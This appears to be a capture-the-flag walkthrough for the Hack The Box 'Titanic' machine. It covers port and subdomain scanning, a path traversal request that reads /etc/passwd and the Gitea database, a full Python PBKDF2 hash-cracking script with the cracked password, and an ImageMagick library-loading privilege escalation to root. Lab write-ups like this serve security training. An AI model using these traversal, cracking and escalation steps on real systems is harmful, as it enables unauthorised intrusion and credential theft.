VPN 10.10.11.61

1.  INFO: Add IP to hosts file

RUN: sudo nano /etc/hosts

2.  RUN: **nmap -sV -Pn heal.htb**

Result: PORTS FOUND: 22, 80

![](images/media/image1.png){width="3.6978029308836398in"
height="1.3584842519685039in"}

3.  Add 10.10.11.55 titanic.htb to /etc/hosts file

4.  Activate Foxyproxy in Firefox

5.  Open <http://titanic.htb:80>

![](images/media/image2.png){width="5.450550087489064in"
height="1.6964096675415572in"}

- Start Burpsuite, activate INTERCEPT

- Book a ticket on Website (push SUBMIT button)

6.  **Push** **FORWARD**

![](images/media/image3.png){width="3.9890113735783026in"
height="2.130229658792651in"}

- Right click -\> **Send to Repeater**

Replace 1^st^ line with: **GET
/download?ticket=../../../../../../etc/passwd HTTP/1.1**

![](images/media/image4.png){width="3.565935039370079in"
height="1.3753248031496064in"}

1^st^ line Replaced (Result: see screenshot below)

- Push SEND

![](images/media/image5.png){width="5.9845505249343836in"
height="2.0439555993000873in"}

Result

![](images/media/image6.png){width="5.987437664041995in"
height="3.764003718285214in"}

USER.txt FLAG

![](images/media/image7.png){width="5.978022747156605in"
height="2.451998031496063in"}

**[SUBDOMAIN FUZZ]{.underline}**

1.  RUN: **ffuf -w
    /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u
    http://titanic.htb -H \"Host:FUZZ.titanic.htb\" -ac**

> ![](images/media/image8.png){width="5.428571741032371in"
> height="2.4679133858267717in"}
>
> Add **dev.titanic.htb** to **/etc/hosts** file

![](images/media/image9.png){width="4.7692311898512685in"
height="1.7352701224846894in"}

2.  Open [**http://dev.titanic.htb**](http://dev.titanic.htb)

> ![](images/media/image10.png){width="4.208791557305337in"
> height="3.76788823272091in"}

3.  Gitea DB is generally in **/data/gitea.db**

**[CRACK PASSWORD]{.underline}**

7.  Replace 1^st^ line with db

Search for USER: developer

![](images/media/image11.png){width="6.290972222222222in"
height="4.324305555555555in"}

8.  Password HASH (**blue highlighted**)

Salt (**red squares**)

![](images/media/image12.png){width="6.290972222222222in"
height="3.763888888888889in"}

9.  **INFO:** Use this script to crack (Target hash + salt) or use
    Hashcat

**Create script.py and put this inside**

[import hashlib]{.mark}

[import binascii]{.mark}

[]{.mark}

[def pbkdf2_hash(password, salt, iterations=50000, dklen=50):]{.mark}

[hash_value = hashlib.pbkdf2_hmac(]{.mark}

[\'sha256\',]{.mark}

[password.encode(\'utf-8\'),]{.mark}

[salt,]{.mark}

[iterations,]{.mark}

[dklen]{.mark}

[)]{.mark}

[return hash_value]{.mark}

[]{.mark}

[def find_matching_password(dictionary_file, target_hash, salt,
iterations=50000, dklen=50):]{.mark}

[target_hash_bytes = binascii.unhexlify(target_hash)]{.mark}

[]{.mark}

[with open(dictionary_file, \'r\', encoding=\'utf-8\') as file:]{.mark}

[count = 0]{.mark}

[for line in file:]{.mark}

[password = line.strip()]{.mark}

[hash_value = pbkdf2_hash(password, salt, iterations, dklen)]{.mark}

[count += 1]{.mark}

[print(f\"Checking_password {count}: {password}\")]{.mark}

[if hash_value == target_hash_bytes:]{.mark}

[print(f\"\\nFound password: {password}\")]{.mark}

[return password]{.mark}

[print(\"Password not found.\")]{.mark}

[return None]{.mark}

[]{.mark}

[salt = binascii.unhexlify(\'8bf3e3452b78544f8bee9400d6936d34\')]{.mark}

[target_hash =
\'e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56\']{.mark}

[dictionary_file = \'/home/kali/Desktop/rockyou.txt\']{.mark}

[find_matching_password(dictionary_file, target_hash, salt)]{.mark}

Should look like this

![](images/media/image13.png){width="5.450550087489064in"
height="3.480073272090989in"}

10. Put Target-hash and salt in the script (lines 30,31)

11. Crack it with script.py RUN: **python3 script.py**

**[PASSWORD: 25282528 found for USER: developer]{.mark}**

![](images/media/image14.png){width="0.8708333333333333in"
height="4.524708005249344in"}

Password found

![](images/media/image15.png){width="0.88125in"
height="0.15347222222222223in"}

**[ROOT]{.underline}**

1.  Login with User: **ssh <developer@titanic.htb>** Password:
    **25282528**

2.  You'll find a script under **/opt/scripts**

3.  Find vulnerability: Check version of **magick**

> RUN: **magick -version**
>
> **Source:**
> <https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8>

4.  According to identifiy_image.sh, **libxch.so.1** needs to be
    generated under **/opt/app/static/assets/images**

> **INFO:** This directory can be found, if you run: **find / -writable
> -type d 2\>/dev/null**
>
> ![](images/media/image16.png){width="3.6320002187226597in"
> height="0.8003051181102362in"}
>
> This causes **magick** (under root permissions) to **read root.txt**

- Put it into a **Python-script**, e.g. **script.py** or paste it
  directly into the terminal, as below.

> ![](images/media/image17.png){width="5.425522747156605in"
> height="3.83200021872266in"}

- List files in directory

![](images/media/image18.png){width="4.767075678040245in"
height="1.1993055555555556in"}

- Modify original directory content. E.G. copy a jpg file.

![](images/media/image19.png){width="4.779558180227472in"
height="0.503999343832021in"}

- Check if **libxcb.so.1** and **root flag** is there

- Display **root flag**

![](images/media/image20.png){width="4.779166666666667in"
height="0.8139238845144356in"}
